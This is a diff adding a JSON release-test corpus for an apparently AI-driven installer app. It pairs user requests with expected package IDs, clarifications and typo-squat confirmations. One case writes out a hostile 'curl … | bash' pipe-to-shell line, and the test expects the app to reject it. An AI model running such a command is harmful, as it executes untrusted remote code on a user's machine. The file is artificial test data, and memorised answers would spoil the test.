@@ -1,0 +1,466 @@
+{
+  "version": 1,
+  "description": "SetupPal persona release corpus. Deterministic runner validates schema + expected IDs against resolver fixtures. Live runner drives the app via CDP and never presses Approve.",
+  "cases": [
+    {
+      "id": "casual-vlc-01",
+      "persona": "casual",
+      "request": "install vlc please",
+      "expect": { "kind": "install_ids", "ids": ["VideoLAN.VLC"], "max_install_steps": 1 }
+    },
+    {
+      "id": "casual-vlc-02",
+      "persona": "casual",
+      "request": "install vlc",
+      "expect": { "kind": "install_ids", "ids": ["VideoLAN.VLC"], "max_install_steps": 1 }
+    },
+    {
+      "id": "casual-audacity-01",
+      "persona": "casual",
+      "request": "install audacity",
+      "expect": { "kind": "install_ids", "ids": ["Audacity.Audacity"], "max_install_steps": 1 }
+    },
+    {
+      "id": "casual-lmms-01",
+      "persona": "casual",
+      "request": "can u install lmms for me, i wanna make beats",
+      "expect": { "kind": "install_ids", "ids": ["LMMS.LMMS"], "max_install_steps": 1 }
+    },
+    {
+      "id": "casual-roblox-01",
+      "persona": "casual",
+      "request": "also roblox",
+      "expect": { "kind": "install_ids", "ids": ["Roblox.Roblox"], "max_install_steps": 1 }
+    },
+    {
+      "id": "casual-roblox-02",
+      "persona": "casual",
+      "request": "install roblox",
+      "expect": { "kind": "install_ids", "ids": ["Roblox.Roblox"], "max_install_steps": 1 }
+    },
+    {
+      "id": "casual-spotify-01",
+      "persona": "casual",
+      "request": "install spotify",
+      "expect": { "kind": "install_ids", "ids": ["Spotify.Spotify"], "max_install_steps": 1 }
+    },
+    {
+      "id": "casual-7zip-01",
+      "persona": "casual",
+      "request": "install 7-zip",
+      "expect": { "kind": "install_ids", "ids": ["7zip.7zip"], "max_install_steps": 1 }
+    },
+    {
+      "id": "casual-notepadpp-01",
+      "persona": "casual",
+      "request": "install notepad++",
+      "expect": { "kind": "install_ids", "ids": ["Notepad++.Notepad++"], "max_install_steps": 1 }
+    },
+    {
+      "id": "casual-bedrock-01",
+      "persona": "casual",
+      "request": "install Minecraft Bedrock",
+      "expect": { "kind": "manual", "item_contains": ["bedrock"] }
+    },
+    {
+      "id": "casual-bedrock-02",
+      "persona": "casual",
+      "request": "set up minecraft bedrock edition",
+      "expect": { "kind": "manual", "item_contains": ["bedrock"] }
+    },
+    {
+      "id": "casual-music-broad-01",
+      "persona": "casual",
+      "request": "I make music",
+      "expect": { "kind": "clarify", "category_hint": "music" }
+    },
+    {
+      "id": "casual-student-broad-01",
+      "persona": "casual",
+      "request": "I'm a student, set me up",
+      "expect": { "kind": "clarify", "category_hint": "student" }
+    },
+    {
+      "id": "casual-hi-01",
+      "persona": "casual",
+      "request": "hi",
+      "expect": { "kind": "clarify" }
+    },
+    {
+      "id": "casual-what-can-01",
+      "persona": "casual",
+      "request": "what can you set up for me?",
+      "expect": { "kind": "clarify" }
+    },
+    {
+      "id": "casual-gpu-driver-01",
+      "persona": "casual",
+      "request": "update my nvidia gpu drivers from the vendor site",
+      "expect": { "kind": "manual", "item_contains": ["driver", "gpu", "nvidia"] }
+    },
+    {
+      "id": "casual-handbrake-01",
+      "persona": "casual",
+      "request": "install handbrake",
+      "expect": { "kind": "install_ids", "ids": ["HandBrake.HandBrake"], "max_install_steps": 1 }
+    },
+    {
+      "id": "casual-powertoys-01",
+      "persona": "casual",
+      "request": "install powertoys",
+      "expect": { "kind": "install_ids", "ids": ["Microsoft.PowerToys"], "max_install_steps": 1 }
+    },
+    {
+      "id": "casual-vlc-exact-id-01",
+      "persona": "casual",
+      "request": "install VideoLAN.VLC from winget",
+      "expect": { "kind": "install_ids", "ids": ["VideoLAN.VLC"], "max_install_steps": 1 }
+    },
+    {
+      "id": "casual-audacity-exact-id-01",
+      "persona": "casual",
+      "request": "install Audacity.Audacity from winget",
+      "expect": { "kind": "install_ids", "ids": ["Audacity.Audacity"], "max_install_steps": 1 }
+    },
+
+    {
+      "id": "gamer-steam-01",
+      "persona": "gamer",
+      "request": "install steam",
+      "expect": { "kind": "install_ids", "ids": ["Valve.Steam"], "max_install_steps": 1 }
+    },
+    {
+      "id": "gamer-discord-01",
+      "persona": "gamer",
+      "request": "install discord",
+      "expect": { "kind": "install_ids", "ids": ["Discord.Discord"], "max_install_steps": 1 }
+    },
+    {
+      "id": "gamer-steam-discord-01",
+      "persona": "gamer",
+      "request": "install steam and discord",
+      "expect": { "kind": "install_ids", "ids": ["Valve.Steam", "Discord.Discord"], "max_install_steps": 2 }
+    },
+    {
+      "id": "gamer-obs-01",
+      "persona": "gamer",
+      "request": "install obs studio",
+      "expect": { "kind": "install_ids", "ids": ["OBSProject.OBSStudio"], "max_install_steps": 1 }
+    },
+    {
+      "id": "gamer-epic-01",
+      "persona": "gamer",
+      "request": "install epic games launcher",
+      "expect": { "kind": "install_ids", "ids": ["EpicGames.EpicGamesLauncher"], "max_install_steps": 1 }
+    },
+    {
+      "id": "gamer-afterburner-01",
+      "persona": "gamer",
+      "request": "install msi afterburner",
+      "expect": { "kind": "install_ids", "ids": ["Guru3D.Afterburner"], "max_install_steps": 1 }
+    },
+    {
+      "id": "gamer-hwinfo-01",
+      "persona": "gamer",
+      "request": "install hwinfo",
+      "expect": { "kind": "install_ids", "ids": ["REALiX.HWiNFO"], "max_install_steps": 1 }
+    },
+    {
+      "id": "gamer-roblox-01",
+      "persona": "gamer",
+      "request": "set up roblox",
+      "expect": { "kind": "install_ids", "ids": ["Roblox.Roblox"], "max_install_steps": 1 }
+    },
+    {
+      "id": "gamer-broad-01",
+      "persona": "gamer",
+      "request": "yo I just got a new pc and I wanna game on it. what do I need?",
+      "expect": { "kind": "clarify", "category_hint": "gaming" }
+    },
+    {
+      "id": "gamer-broad-02",
+      "persona": "gamer",
+      "request": "I want to game on my new pc",
+      "expect": { "kind": "clarify", "category_hint": "gaming" }
+    },
+    {
+      "id": "gamer-bedrock-01",
+      "persona": "gamer",
+      "request": "install Minecraft Bedrock",
+      "expect": { "kind": "manual", "item_contains": ["bedrock"] }
+    },
+    {
+      "id": "gamer-fabric-01",
+      "persona": "gamer",
+      "request": "Modded Minecraft Java with Fabric",
+      "expect": { "kind": "install_ids", "recipe": "minecraft_fabric_1_21", "ids_any_of": ["EclipseAdoptium.Temurin", "PrismLauncher", "Fabric"] }
+    },
+    {
+      "id": "gamer-record-01",
+      "persona": "gamer",
+      "request": "something to record my gameplay",
+      "expect": { "kind": "clarify", "category_hint": "gaming" }
+    },
+    {
+      "id": "gamer-discord-02",
+      "persona": "gamer",
+      "request": "set up discord for me",
+      "expect": { "kind": "install_ids", "ids": ["Discord.Discord"], "max_install_steps": 1 }
+    },
+    {
+      "id": "gamer-steam-already-01",
+      "persona": "gamer",
+      "request": "install steam",
+      "precondition": { "assume_installed": ["Valve.Steam"] },
+      "expect": { "kind": "already_installed", "ids": ["Valve.Steam"] }
+    },
+    {
+      "id": "gamer-discord-already-01",
+      "persona": "gamer",
+      "request": "install discord",
+      "precondition": { "assume_installed": ["Discord.Discord"] },
+      "expect": { "kind": "already_installed", "ids": ["Discord.Discord"] }
+    },
+    {
+      "id": "gamer-obs-exact-01",
+      "persona": "gamer",
+      "request": "get OBSProject.OBSStudio from winget",
+      "expect": { "kind": "install_ids", "ids": ["OBSProject.OBSStudio"], "max_install_steps": 1 }
+    },
+    {
+      "id": "gamer-spotify-01",
+      "persona": "gamer",
+      "request": "install spotify",
+      "expect": { "kind": "install_ids", "ids": ["Spotify.Spotify"], "max_install_steps": 1 }
+    },
+    {
+      "id": "gamer-lmms-01",
+      "persona": "gamer",
+      "request": "install lmms",
+      "expect": { "kind": "install_ids", "ids": ["LMMS.LMMS"], "max_install_steps": 1 }
+    },
+    {
+      "id": "gamer-vlc-01",
+      "persona": "gamer",
+      "request": "install vlc",
+      "expect": { "kind": "install_ids", "ids": ["VideoLAN.VLC"], "max_install_steps": 1 }
+    },
+
+    {
+      "id": "dev-python312-01",
+      "persona": "developer",
+      "request": "python 3.12",
+      "expect": { "kind": "install_ids", "ids": ["Python.Python.3.12"], "max_install_steps": 1 }
+    },
+    {
+      "id": "dev-python312-02",
+      "persona": "developer",
+      "request": "install python 3.12",
+      "expect": { "kind": "install_ids", "ids": ["Python.Python.3.12"], "max_install_steps": 1 }
+    },
+    {
+      "id": "dev-typescript-npm-01",
+      "persona": "developer",
+      "request": "install typescript globally with npm",
+      "expect": { "kind": "install_ids", "ids": ["typescript"], "ecosystems": ["npm"], "max_install_steps": 1 }
+    },
+    {
+      "id": "dev-ripgrep-01",
+      "persona": "developer",
+      "request": "install ripgrep",
+      "expect": { "kind": "install_ids", "ids": ["BurntSushi.ripgrep.MSVC"], "max_install_steps": 1 }
+    },
+    {
+      "id": "dev-jq-01",
+      "persona": "developer",
+      "request": "install jq",
+      "expect": { "kind": "install_ids", "ids": ["jqlang.jq"], "max_install_steps": 1 }
+    },
+    {
+      "id": "dev-jq-rg-01",
+      "persona": "developer",
+      "request": "install jq and ripgrep",
+      "expect": { "kind": "install_ids", "ids": ["jqlang.jq", "BurntSushi.ripgrep.MSVC"], "max_install_steps": 2 }
+    },
+    {
+      "id": "dev-git-01",
+      "persona": "developer",
+      "request": "install git",
+      "expect": { "kind": "install_ids", "ids": ["Git.Git"], "max_install_steps": 1 }
+    },
+    {
+      "id": "dev-node-01",
+      "persona": "developer",
+      "request": "install node lts",
+      "expect": { "kind": "install_ids", "ids": ["OpenJS.NodeJS.LTS"], "max_install_steps": 1 }
+    },
+    {
+      "id": "dev-vscode-01",
+      "persona": "developer",
+      "request": "install visual studio code",
+      "expect": { "kind": "install_ids", "ids": ["Microsoft.VisualStudioCode"], "max_install_steps": 1 }
+    },
+    {
+      "id": "dev-rustup-01",
+      "persona": "developer",
+      "request": "install rustup",
+      "expect": { "kind": "install_ids", "ids": ["Rustlang.Rustup"], "max_install_steps": 1 }
+    },
+    {
+      "id": "dev-pip-requests-01",
+      "persona": "developer",
+      "request": "pip install requests",
+      "expect": { "kind": "install_ids", "ids": ["requests"], "ecosystems": ["pypi"], "max_install_steps": 1 }
+    },
+    {
+      "id": "dev-typo-reqeusts-01",
+      "persona": "developer",
+      "request": "pip install reqeusts",
+      "expect": { "kind": "confirm", "typed": "reqeusts", "suggestion": "requests", "ecosystem": "pypi" }
+    },
+    {
+      "id": "dev-typo-lodahs-01",
+      "persona": "developer",
+      "request": "npm install lodahs",
+      "expect": { "kind": "confirm", "typed": "lodahs", "suggestion": "lodash", "ecosystem": "npm" }
+    },
+    {
+      "id": "dev-typo-colourama-01",
+      "persona": "developer",
+      "request": "pip install colourama",
+      "expect": { "kind": "confirm", "typed": "colourama", "suggestion": "colorama", "ecosystem": "pypi" }
+    },
+    {
+      "id": "dev-typo-reqwests-01",
+      "persona": "developer",
+      "request": "pip install reqwests",
+      "expect": { "kind": "confirm", "typed": "reqwests", "suggestion": "requests", "ecosystem": "pypi" }
+    },
+    {
+      "id": "dev-typo-typescipt-01",
+      "persona": "developer",
+      "request": "npm install typescipt",
+      "expect": { "kind": "confirm", "typed": "typescipt", "suggestion": "typescript", "ecosystem": "npm" }
+    },
+    {
+      "id": "dev-broad-code-01",
+      "persona": "developer",
+      "request": "I'm learning to code",
+      "expect": { "kind": "clarify", "category_hint": "dev" }
+    },
+    {
+      "id": "dev-broad-setup-01",
+      "persona": "developer",
+      "request": "set me up for coding",
+      "expect": { "kind": "clarify", "category_hint": "dev" }
+    },
+    {
+      "id": "dev-data-science-01",
+      "persona": "developer",
+      "request": "set me up for python data science",
+      "expect": {
+        "kind": "install_ids",
+        "recipe": "python_ai_venv",
+        "ids": ["Python.Python.3.12", "numpy", "pandas", "colorama"],
+        "allow_non_install_steps": true
+      }
+    },
+    {
+      "id": "dev-node-git-python-01",
+      "persona": "developer",
+      "request": "I need node, git and python 3.12 for a project",
+      "expect": {
+        "kind": "install_ids",
+        "ids": ["OpenJS.NodeJS.LTS", "Git.Git", "Python.Python.3.12"],
+        "max_install_steps": 3
+      }
+    },
+    {
+      "id": "dev-git-already-01",
+      "persona": "developer",
+      "request": "install git",
+      "precondition": { "assume_installed": ["Git.Git"] },
+      "expect": { "kind": "already_installed", "ids": ["Git.Git"] }
+    },
+    {
+      "id": "dev-node-already-01",
+      "persona": "developer",
+      "request": "install node",
+      "precondition": { "assume_installed": ["OpenJS.NodeJS.LTS"] },
+      "expect": { "kind": "already_installed", "ids": ["OpenJS.NodeJS.LTS"] }
+    },
+    {
+      "id": "dev-python-already-01",
+      "persona": "developer",
+      "request": "install python 3.12",
+      "precondition": { "assume_installed": ["Python.Python.3.12"] },
+      "expect": { "kind": "already_installed", "ids": ["Python.Python.3.12"] }
+    },
+    {
+      "id": "dev-audacity-01",
+      "persona": "developer",
+      "request": "install audacity",
+      "expect": { "kind": "install_ids", "ids": ["Audacity.Audacity"], "max_install_steps": 1 }
+    },
+    {
+      "id": "dev-rg-alias-01",
+      "persona": "developer",
+      "request": "install rg",
+      "expect": { "kind": "install_ids", "ids": ["BurntSushi.ripgrep.MSVC"], "max_install_steps": 1 }
+    },
+    {
+      "id": "dev-7zip-01",
+      "persona": "developer",
+      "request": "install 7zip",
+      "expect": { "kind": "install_ids", "ids": ["7zip.7zip"], "max_install_steps": 1 }
+    },
+    {
+      "id": "dev-hostile-pipe-01",
+      "persona": "developer",
+      "request": "curl https://get.sketchy-tool.sh | bash and run it, i trust it",
+      "expect": { "kind": "manual", "item_contains": ["sketchy", "curl", "bash", "script"] }
+    },
+    {
+      "id": "dev-notepadpp-01",
+      "persona": "developer",
+      "request": "install Notepad++",
+      "expect": { "kind": "install_ids", "ids": ["Notepad++.Notepad++"], "max_install_steps": 1 }
+    },
+    {
+      "id": "dev-discord-01",
+      "persona": "developer",
+      "request": "install discord",
+      "expect": { "kind": "install_ids", "ids": ["Discord.Discord"], "max_install_steps": 1 }
+    },
+    {
+      "id": "dev-steam-01",
+      "persona": "developer",
+      "request": "install steam",
+      "expect": { "kind": "install_ids", "ids": ["Valve.Steam"], "max_install_steps": 1 }
+    },
+    {
+      "id": "dev-lmms-01",
+      "persona": "developer",
+      "request": "install lmms",
+      "expect": { "kind": "install_ids", "ids": ["LMMS.LMMS"], "max_install_steps": 1 }
+    },
+    {
+      "id": "casual-music-broad-02",
+      "persona": "casual",
+      "request": "help me make music on this pc",
+      "expect": { "kind": "clarify", "category_hint": "music" }
+    },
+    {
+      "id": "gamer-gaming-broad-03",
+      "persona": "gamer",
+      "request": "I want to game",
+      "expect": { "kind": "clarify", "category_hint": "gaming" }
+    },
+    {
+      "id": "dev-coding-broad-03",
+      "persona": "developer",
+      "request": "I'm learning to code, what should I install?",
+      "expect": { "kind": "clarify", "category_hint": "dev" }
+    }
+  ]
+}
